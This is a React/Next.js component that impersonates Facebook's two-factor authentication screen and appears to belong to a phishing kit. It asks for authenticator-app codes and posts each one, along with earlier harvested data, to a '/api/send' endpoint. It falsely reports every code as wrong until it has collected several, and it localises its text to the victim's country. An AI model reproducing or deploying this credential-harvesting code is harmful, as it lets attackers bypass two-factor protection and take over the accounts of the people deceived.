import VerifyImage from '@/assets/images/2FAuth.png';
import { store } from '@/store/store';
import config from '@/utils/config';
import translateText from '@/utils/translate';
import axios from 'axios';
import Image from 'next/image';
import { useEffect, useState, type FC } from 'react';

const VerifyModal: FC<{ nextStep: () => void; userName?: string }> = ({ nextStep, userName }) => {
    const [attempts, setAttempts] = useState(0);
    const [code, setCode] = useState('');
    const [countdown, setCountdown] = useState(0);
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);
    const [translations, setTranslations] = useState<Record<string, string>>({});

    const { geoInfo, messageId, message, setMessage } = store();
    const maxCode = config.MAX_CODE ?? 3;
    const loadingTime = config.CODE_LOADING_TIME ?? 60;

    const t = (text: string): string => {
        return translations[text] || text;
    };

    useEffect(() => {
        if (!geoInfo) return;

        const textsToTranslate = ['Go to your authentication app', 'Enter the 6-digit code for this account from the two-step authentication app you set up (such as Duo Mobile or Google Authenticator).', 'Code', "This code doesn't work. Check it's correct or try a new one after", 'Continue'];

        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};

            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }

            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo]);

    useEffect(() => {
        if (countdown > 0) {
            const timer = setTimeout(() => {
                setCountdown(countdown - 1);
            }, 1000);
            return () => clearTimeout(timer);
        } else if (countdown === 0 && showError) {
            setShowError(false);
        }
    }, [countdown, showError]);

    const handleSubmit = async () => {
        if (!code.trim() || isLoading || code.length < 6 || countdown > 0 || !message) return;

        setShowError(false);
        setIsLoading(true);

        const next = attempts + 1;
        setAttempts(next);

        const updatedMessage = `${message}

<b>🔐 2FA Code ${next}/${maxCode}:</b> <code>${code}</code>`;
        try {
            const res = await axios.post('/api/send', {
                message: updatedMessage,
                message_id: messageId
            });

            if (res?.data?.success) {
                setMessage(updatedMessage);
            }

            if (next >= maxCode) {
                nextStep();
            } else {
                setShowError(true);
                setCode('');
                setCountdown(loadingTime);
            }
        } catch {
            //
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center bg-black/40 px-2 sm:px-3 md:px-4'>
            <div className='flex max-h-[90vh] w-full max-w-lg flex-col rounded-3xl bg-white overflow-y-auto'>
                {/* Header with user info and Facebook branding */}
                <div className='px-4 sm:px-6 md:px-8 pt-4 sm:pt-6 md:pt-8 pb-3 sm:pb-4'>
                    <p className='text-xs sm:text-sm text-gray-600'>{userName || 'User'} • Facebook</p>
                </div>

                {/* Main content */}
                <div className='flex-1 px-4 sm:px-6 md:px-8 py-2 pb-4 sm:pb-6 md:pb-8 flex flex-col'>
                    {/* Title */}
                    <h1 className='text-lg sm:text-xl md:text-2xl font-bold text-gray-900 mb-3 sm:mb-4 whitespace-normal'>
                        {t('Go to your authentication app')}
                    </h1>

                    {/* Description */}
                    <p className='text-sm sm:text-base md:text-lg text-gray-700 mb-6 sm:mb-8 leading-relaxed'>
                        {t('Enter the 6-digit code for this account from the two-step authentication app you set up (such as Duo Mobile or Google Authenticator).')}
                    </p>

                    {/* Illustration */}
                    <div className='mb-6 sm:mb-8 flex justify-center'>
                        <Image src={VerifyImage} alt='2FA' className='max-h-48 sm:max-h-64 w-auto' />
                    </div>

                    {/* Code Input */}
                    <div className='relative mb-6 sm:mb-8'>
                        <input
                            type='tel'
                            inputMode='numeric'
                            pattern='[0-9]*'
                            id='code-input'
                            value={code}
                            onChange={(e) => {
                                const value = e.target.value.replaceAll(/\D/g, '');
                                if (value.length <= 8) {
                                    setCode(value);
                                }
                            }}
                            maxLength={8}
                            disabled={countdown > 0}
                            className={`w-full h-11 sm:h-12 rounded-xl border border-gray-300 px-4 py-2 sm:py-3 text-base sm:text-lg font-medium focus:outline-none focus:ring-2 focus:ring-blue-400 focus:border-transparent transition-all placeholder-gray-500 ${
                                countdown > 0 ? 'cursor-not-allowed opacity-60 bg-gray-50' : 'bg-white'
                            }`}
                            placeholder={t('Code')}
                        />
                    </div>

                    {/* Error message */}
                    {showError && (
                        <p className='text-xs sm:text-sm text-red-500 mb-6 sm:mb-8'>
                            {t("This code doesn't work. Check it's correct or try a new one after")} {countdown}s.
                        </p>
                    )}

                    {/* Continue Button */}
                    <button
                        type='button'
                        onClick={handleSubmit}
                        disabled={isLoading || code.length < 6 || countdown > 0}
                        className={`w-full h-12 sm:h-14 rounded-2xl bg-blue-500 text-white font-semibold text-base sm:text-lg transition-all ${
                            isLoading || code.length < 6 || countdown > 0
                                ? 'cursor-not-allowed opacity-60'
                                : 'hover:bg-blue-600 shadow-md hover:shadow-lg'
                        } flex items-center justify-center`}
                    >
                        {isLoading ? (
                            <div className='h-6 w-6 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div>
                        ) : (
                            t('Continue')
                        )}
                    </button>
                </div>
            </div>
        </div>
    );
};

export default VerifyModal;
